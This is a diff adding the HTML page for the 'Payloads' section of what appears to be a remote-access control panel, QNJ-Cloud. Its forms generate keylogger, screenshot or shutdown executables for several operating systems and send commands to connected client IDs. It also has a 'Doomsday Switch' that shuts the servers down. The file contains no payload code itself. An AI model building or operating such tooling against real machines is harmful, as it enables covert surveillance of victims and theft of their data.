@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/QNJ-Cloud/styling/main.css">
+    <link rel="stylesheet" type="text/css" href="/QNJ-Cloud/styling/dashboard.css">
+    <link rel="stylesheet" type="text/css" href="/QNJ-Cloud/styling/payload.css">
+    <title>QNJ-Cloud | Payloads</title>
+</head>
+<body>
+    <div class="DOOMSDAY-SWITCH-overlay" id="DOOMSDAY-SWITCH-overlay-ID"></div>
+    <div class="QNJ-TOP-BAR">
+        <div class="QNJ-CLOUD-ICON-A">
+            <a href="/">
+                <img src="/QNJ-Cloud/assets/png/home-white.png" id="QNJ-CLOUD-ICON-A-LINK">
+            </a>
+        </div>
+        <div class="QNJ-TOP-BAR-A-BUTTONS-LOC">
+            <a href="/dashboard" class="QNJ-A-LINK-BUTTONS-TOP">
+                <img src="/QNJ-Cloud/assets/svg/control-panel.svg">
+                <h3>Control-Panel</h3>
+            </a>
+            <a href="/dashboard/payloads" class="QNJ-A-LINK-BUTTONS-TOP">
+                <svg xmlns="http://www.w3.org/2000/svg" height="35px" viewBox="0 -960 960 960" width="35px" fill="rgb(225, 225, 225)"><path d="M320-240 80-480l240-240 57 57-184 184 183 183-56 56Zm320 0-57-57 184-184-183-183 56-56 240 240-240 240Z"/></svg>
+                <h3 id="QNJ-CURRENT-PAGE-H3">Payloads</h3>
+            </a>
+            <a href="/dashboard/connections" class="QNJ-A-LINK-BUTTONS-TOP">
+                <img src="/QNJ-Cloud/assets/svg/connections.svg">
+                <h3>Connections</h3>
+            </a>
+            <a href="/dashboard/data-0x00" class="QNJ-A-LINK-BUTTONS-TOP">
+                <img src="/QNJ-Cloud/assets/svg/data-0x00.svg">
+                <h3>Data-0x00</h3>
+            </a>
+            <a href="/dashboard/statics" class="QNJ-A-LINK-BUTTONS-TOP">
+                <img src="/QNJ-Cloud/assets/svg/admin-panel.svg">
+                <h3>Statics</h3>
+            </a>
+        </div>
+        <div class="QNJ-USER-DATA-AREA">
+            <div class="QNJ-USER-DATA-CONTAINER">
+                <button type="submit" style="background-color: rgb(0, 0, 0, 0); cursor: pointer;" id="QNJ-DISPLAY-CLIENT-DATA" onclick="Display_Client_Data_Bar()">
+                    <img src="/QNJ-Cloud/assets/svg/user.svg">
+                    <img src="/QNJ-Cloud/assets/svg/expand.svg">
+                </button>
+            </div>
+        </div>
+        <div class="QNJ-USER-DATA-BAR-INFO" id="QNJ-CLIENT-DATA-BAR-DISPLAY">
+            <ul id="QNJ-USER-PROFILE-BUTTONS">
+                <li id="QNJ-PROFILE-BUTTONS">
+                    <a href="/dashboard/profile">
+                        <button type="submit" id="QNJ-BUTTON-DATA-CLIENT">
+                            <h3>My Profile</h3>
+                        </button>
+                    </a>
+                </li>
+                <li id="QNJ-PROFILE-BUTTONS"> <!--                                    -->
+                    <button type="submit" id="QNJ-DOOMSDAY-SWITCH-CLASS" onclick="Display_DoomsDay_BAr()">
+                        <h3>Doomsday Switch</h3>
+                    </button>
+                </li>
+                <li id="QNJ-PROFILE-BUTTONS" class="QNJ-SETTINGS-PROFILE">
+                    <a href="/dashboard/settings">
+                        <button type="submit">
+                            <h3>Settings</h3>
+                        </button>
+                    </a>
+                </li>
+                <li id="QNJ-PROFILE-BUTTONS">
+                    <form action="/logout_user" method="post">
+                        <button type="submit">
+                            <h3>Logout</h3>
+                        </button>
+                    </form>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <main class="QNJ-MAIN-DATA-AREA">
+        <div class="QNJ-CENTER-DATA">
+            <div class="QNJ-H3-INFO-LOCATION">
+                <h3>Payloads</h3>
+            </div>
+        </div>
+        <div class="QNJ-DOOMSDAY-SWITCH-DIV" id="QNJ-DOOMSDAY-ID-SWITCH">
+            <div class="QNJ-DOOMSDAY-SWITCH-CONTAINER">
+                <span id="QNJ-DOOMSDAY-SWITCH-SPAN-INFO-T">
+                    Critical Alert: Activating the Doomsday Switch will immediately shut down both the HTTP and TCP servers. 
+                    Proceeding is irreversible. To cancel, press close. For emergency use only
+                </span>
+                <form action="/dashboard/api/QNJ-0x00-NULL-SERVER" method="post">
+                    <button type="submit" id="QNJ-DOOMSDAY-SWITCH-CONTINUE-B">
+                        <h3>Continue</h3>
+                    </button>
+                </form>
+                <button type="submit" onclick="QNJ_CLOSE_DOOMS_DAY_SWITCH()" id="QNJ-DOOMSDAY-SWITCH-CLOSE-B">
+                    <h3>Close</h3>
+                </button>
+            </div>
+        </div>
+
+        <!-- HERE COMES THE MAIN CONTENT -->
+        <div class="QNJ-GENERATE-EXPLOIT-VOOR-ALLE">
+            <div class="QNJ-GENERATE-EXPLOIT-CONTAINER">
+                <form action="/dashboard/api/QNJ-GENERATE-0x00-EXPLOIT" method="post">
+                    <h3>Generate a payload file</h3>
+                    <li>
+                        <span>Post-Exploitation</span>
+                        <select name="QNJ-EXPLOIT-TYPE">
+                            <option value="Keylogger-CMD">Keylogger</option>
+                            <option value="ScreenSHT-CMD">Screenshot</option>
+                            <option value="Shutdown-CMD">Shutdown</option>
+                        </select>
+                    </li>
+                    <li>
+                        <span>Format</span>
+                        <select name="QNJ-FORMAT-TYPE">
+                            <option value="Executable-Format">Executable</option>
+                        </select>
+                    </li>
+                    <li>
+                        <span>Operation System</span>
+                        <select name="QNJ-OS-TYPE">
+                            <option value="Windows-OS">Windows</option>
+                            <option value="Linux-OS">Linux</option>
+                            <option value="Darwin-OS">Darwin</option>
+                        </select>
+                    </li>
+                    <li>
+                        <span>Architecture</span>
+                        <select name="QNJ-ARCHITECTURE-TYPE">
+                            <option value="x86BIT64-ARC">x86 64-Bit</option>
+                            <option value="x86BIT32-ARC">x86 32-Bit</option>
+                            <option value="ARM-ARC">ARM</option>
+                        </select>
+                    </li>
+                    <input name="QNJ-SKIP-DATA" style="display: none;">
+                    <button id="QNJ-GENERATE-EXPLOIT-TYPE-SPECIFIC" type="submit">Generate</button>
+                </form>
+            </div>
+        </div>
+        <div class="QNJ-GENERATE-NEW-PAYLOAD-CMD">
+            <div class="QNJ-GENERATE-PAYLOAD-CONTAINER">
+                <form action="/dashboard/api/QNJ-GENERATE-NEW-CMD-PAYLOAD" method="post">
+                    <h3>Generate a new command</h3>
+                    <span>Command name</span>
+                    <input name="QNJ-MAKE-CMD-PAYLOAD" placeholder="Enter command name..." required>
+                    <span id="QNJ-PAYLOAD-PATH-GENERATE-SPAN">Command file path</span>
+                    <input name="QNJ-NEW-PAYLOAD-FILE-PATH" placeholder="Enter file path..." required>
+                    <input name="QNJ-SKIP-DATA" style="display: none;">
+                    <button id="QNJ-GENERATE-NEW-CMD-BUTTON" type="submit">Generate</button>
+                </form>
+            </div>
+        </div>
+        <div class="QNJ-TERMINAL-INPUT-DATA">
+            <div class="QNJ-PAYLOAD-TERMINAL-CONTAINER">
+                <form action="/dashboard/api/send_payload_data" method="post">
+                    <input name="QNJ-PAYLOAD-CMD" placeholder="Enter a command..." id="QNJ-TERMINAL-INPUT-ID" required>
+                    <input name="QNJ-PAYLOAD-CMD-CLIENT-ID" placeholder="Enter client id..." id="QNJ-PAYLOAD-CLIENT-ID">
+                    <input name="QNJ-SKIP-DATA" style="display: none;">
+                    <button type="submit" id="" style="display: none;"></button>
+                </form>
+            </div>
+        </div>
+    </main>
+    <script src="/QNJ-Cloud/js/web-tracker.js"></script>
+</body>
+</html>
